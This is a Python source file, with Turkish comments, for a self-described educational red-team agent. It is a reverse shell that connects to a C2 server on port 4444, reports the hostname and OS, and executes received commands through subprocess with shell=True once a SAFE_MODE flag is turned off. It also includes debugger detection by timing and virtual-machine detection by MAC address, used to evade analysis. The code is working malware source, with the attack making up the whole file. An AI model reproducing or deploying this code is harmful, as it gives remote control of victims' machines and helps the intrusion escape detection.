import socket
import subprocess
import sys
import os
import time
import uuid
import platform
import threading

# ==============================================================================
# CONFIGURATION (AYARLAR)
# ==============================================================================
C2_HOST = '127.0.0.1'
C2_PORT = 4444
SAFE_MODE = True  # True ise komutları çalıştırmaz, sadece ekrana basar (Eğitim Modu)

class EnvironmentAuditor:
    """
    Sistemin analiz ortamı (Sandbox/VM/Debugger) olup olmadığını denetler.
    """

    @staticmethod
    def check_debugger_timing():
        """
        Zamanlama analizi yaparak debugger tespiti.
        Debugger varsa kod satırları arasında gecikme olur.
        """
        start = time.time()
        for i in range(1000):
            pass
        end = time.time()
        # Normalde bu işlem 0.001 saniyeden az sürer.
        # Eğer uzun sürüyorsa biri kodu adım adım (step-by-step) izliyordur.
        if (end - start) > 0.1:
            return True
        return False

    @staticmethod
    def check_vm_mac():
        """
        MAC adresinden sanal makine tespiti (VMware, VirtualBox vb.)
        """
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                        for ele in range(0,8*6,8)][::-1])

        # Bilinen VM MAC Adresi Ön Ekleri
        vm_ouis = [
            "00:05:69", # VMware
            "00:0c:29", # VMware
            "00:50:56", # VMware
            "08:00:27", # VirtualBox
            "00:15:5d"  # Hyper-V
        ]

        for oui in vm_ouis:
            if mac.startswith(oui):
                return True
        return False

class RedTeamAgent:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.auditor = EnvironmentAuditor()

    def self_destruct(self, reason):
        print(f"\n[!] TEHDİT ALGILANDI: {reason}")
        print("[!] Analizden kaçmak için operasyon iptal ediliyor...")
        sys.exit(0)

    def connect(self):
        # 1. Güvenlik Kontrolleri
        print("[*] Ortam güvenliği taraması yapılıyor...")

        if self.auditor.check_debugger_timing():
            self.self_destruct("Debugger (Hata Ayıklayıcı) Tespit Edildi!")

        if self.auditor.check_vm_mac():
            # Gerçek bir malware burada çalışmayı durdurur.
            # Eğitim amaçlı olduğumuz için sadece uyarı verelim ama durmayalım.
            print("[!] UYARI: Sanal Makine (VM) ortamındasınız.")
        else:
            print("[+] Ortam temiz (Bare Metal).")

        # 2. Bağlantı Kurma
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"[*] C2 Sunucusuna bağlanılıyor ({self.host}:{self.port})...")
            self.sock.connect((self.host, self.port))
            print("[+] Bağlantı başarılı!")
            self.send_data(f"Ajan Bağlandı! Host: {platform.node()} | OS: {platform.system()}\n")
            self.shell_loop()
        except ConnectionRefusedError:
            print("[-] Bağlantı reddedildi. Dinleyici (Listener) açık mı?")
        except Exception as e:
            print(f"[-] Kritik Hata: {e}")

    def send_data(self, data):
        if self.sock:
            self.sock.send(str(data).encode('utf-8'))

    def shell_loop(self):
        while True:
            try:
                command = self.sock.recv(1024).decode('utf-8').strip()

                if not command or command.lower() == 'exit':
                    break

                if SAFE_MODE:
                    # Eğitim modunda komutu çalıştırma, sadece ne yapacağını söyle
                    response = f"[SAFE_MODE] Komut alındı ama çalıştırılmadı: {command}\n"
                    print(f"[*] Sunucudan gelen komut: {command}")
                else:
                    # Gerçek çalıştırma (subprocess)
                    try:
                        proc = subprocess.run(command, shell=True, capture_output=True)
                        response = proc.stdout + proc.stderr
                        if not response: response = b"Komut kostu, cikti yok.\n"
                    except Exception as e:
                        response = f"Hata: {e}\n".encode('utf-8')

                # Cevabı gönder (string ise encode et)
                if isinstance(response, str):
                    response = response.encode('utf-8')
                self.sock.send(response)

            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[-] Döngü hatası: {e}")
                break

        if self.sock:
            self.sock.close()

if __name__ == "__main__":
    # Banner
    print("""
    ███████╗██████╗ ██╗   ██╗
    ██╔════╝██╔══██╗██║   ██║
    ███████╗██████╔╝██║   ██║
    ╚════██║██╔═══╝ ╚██╗ ██╔╝
    ███████║██║      ╚████╔╝
    ╚══════╝╚═╝       ╚═══╝
    -- Advanced Educational Agent --
    """)

    agent = RedTeamAgent(C2_HOST, C2_PORT)
    agent.connect()
